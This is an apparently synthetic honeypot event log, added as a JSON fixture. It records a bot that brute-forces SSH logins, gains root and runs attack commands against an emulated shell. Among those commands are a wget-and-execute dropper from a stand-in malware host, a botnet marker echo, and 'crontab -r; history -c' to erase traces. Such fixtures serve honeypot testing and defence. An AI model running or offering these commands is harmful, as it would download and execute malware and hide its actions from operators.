@@ -1,0 +1,167 @@
+[
+  {
+    "event_id": "63a20401-a478-5af5-b6c8-408616b4f2a3",
+    "session_id": "ssh-bot00001",
+    "type": "session_start",
+    "timestamp": "2026-10-24T18:00:00.000Z",
+    "source": "wild",
+    "protocol": "ssh",
+    "src_ip": "203.0.113.10",
+    "detail": {
+      "client": "SSH-2.0-Go"
+    }
+  },
+  {
+    "event_id": "05f3073d-2489-570e-a940-3b10df17f3f4",
+    "session_id": "ssh-bot00001",
+    "type": "login_fail",
+    "timestamp": "2026-10-24T18:00:00.300Z",
+    "source": "wild",
+    "protocol": "ssh",
+    "src_ip": "203.0.113.10",
+    "detail": {
+      "username": "root",
+      "success": false
+    }
+  },
+  {
+    "event_id": "625d4864-7e92-5f5b-bb09-af8699b90cb9",
+    "session_id": "ssh-bot00001",
+    "type": "login_fail",
+    "timestamp": "2026-10-24T18:00:00.600Z",
+    "source": "wild",
+    "protocol": "ssh",
+    "src_ip": "203.0.113.10",
+    "detail": {
+      "username": "admin",
+      "success": false
+    }
+  },
+  {
+    "event_id": "808ad046-f156-5e08-a995-3e6504ec5071",
+    "session_id": "ssh-bot00001",
+    "type": "login_fail",
+    "timestamp": "2026-10-24T18:00:00.900Z",
+    "source": "wild",
+    "protocol": "ssh",
+    "src_ip": "203.0.113.10",
+    "detail": {
+      "username": "ubnt",
+      "success": false
+    }
+  },
+  {
+    "event_id": "efedf435-fcc9-5386-b0ff-307aa642c60f",
+    "session_id": "ssh-bot00001",
+    "type": "login_fail",
+    "timestamp": "2026-10-24T18:00:01.200Z",
+    "source": "wild",
+    "protocol": "ssh",
+    "src_ip": "203.0.113.10",
+    "detail": {
+      "username": "pi",
+      "success": false
+    }
+  },
+  {
+    "event_id": "87972269-3580-5dd4-a5eb-c47f09c38731",
+    "session_id": "ssh-bot00001",
+    "type": "login_success",
+    "timestamp": "2026-10-24T18:00:01.500Z",
+    "source": "wild",
+    "protocol": "ssh",
+    "src_ip": "203.0.113.10",
+    "detail": {
+      "username": "root",
+      "success": true
+    }
+  },
+  {
+    "event_id": "94982953-b90a-5360-bbae-1ba459194e0f",
+    "session_id": "ssh-bot00001",
+    "type": "command",
+    "timestamp": "2026-10-24T18:00:01.800Z",
+    "source": "wild",
+    "protocol": "ssh",
+    "src_ip": "203.0.113.10",
+    "detail": {
+      "input": "uname -s -v -n -r -m",
+      "output": "Linux #1 SMP 5.15.0 x86_64",
+      "response_ms": 12,
+      "answered_by": "engine"
+    }
+  },
+  {
+    "event_id": "f7bedf30-8196-50d8-96e5-caa63b722b60",
+    "session_id": "ssh-bot00001",
+    "type": "command",
+    "timestamp": "2026-10-24T18:00:02.000Z",
+    "source": "wild",
+    "protocol": "ssh",
+    "src_ip": "203.0.113.10",
+    "detail": {
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "output": "4",
+      "response_ms": 12,
+      "answered_by": "engine"
+    }
+  },
+  {
+    "event_id": "d390ec08-96c6-513d-bd25-ba6e70794734",
+    "session_id": "ssh-bot00001",
+    "type": "command",
+    "timestamp": "2026-10-24T18:00:02.250Z",
+    "source": "wild",
+    "protocol": "ssh",
+    "src_ip": "203.0.113.10",
+    "detail": {
+      "input": "cd /tmp || cd /var/run || cd /mnt; wget http://malware.example.net/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh",
+      "output": "Connecting to malware.example.net... failed: Connection timed out.",
+      "response_ms": 12,
+      "answered_by": "engine"
+    }
+  },
+  {
+    "event_id": "c7deacce-8a03-574d-834c-f0e7dd34e678",
+    "session_id": "ssh-bot00001",
+    "type": "command",
+    "timestamp": "2026-10-24T18:00:02.450Z",
+    "source": "wild",
+    "protocol": "ssh",
+    "src_ip": "203.0.113.10",
+    "detail": {
+      "input": "echo -e 'gayfgt'",
+      "output": "gayfgt",
+      "response_ms": 12,
+      "answered_by": "engine"
+    }
+  },
+  {
+    "event_id": "b823d08b-142b-5a19-9b58-6f2c821dcde4",
+    "session_id": "ssh-bot00001",
+    "type": "command",
+    "timestamp": "2026-10-24T18:00:02.700Z",
+    "source": "wild",
+    "protocol": "ssh",
+    "src_ip": "203.0.113.10",
+    "detail": {
+      "input": "crontab -r; history -c",
+      "output": "",
+      "response_ms": 12,
+      "answered_by": "engine"
+    }
+  },
+  {
+    "event_id": "8201e258-c730-5621-9fba-201da6d996fc",
+    "session_id": "ssh-bot00001",
+    "type": "session_end",
+    "timestamp": "2026-10-24T18:00:03.000Z",
+    "source": "wild",
+    "protocol": "ssh",
+    "src_ip": "203.0.113.10",
+    "detail": {
+      "duration_s": 3.0,
+      "command_count": 5
+    }
+  }
+]
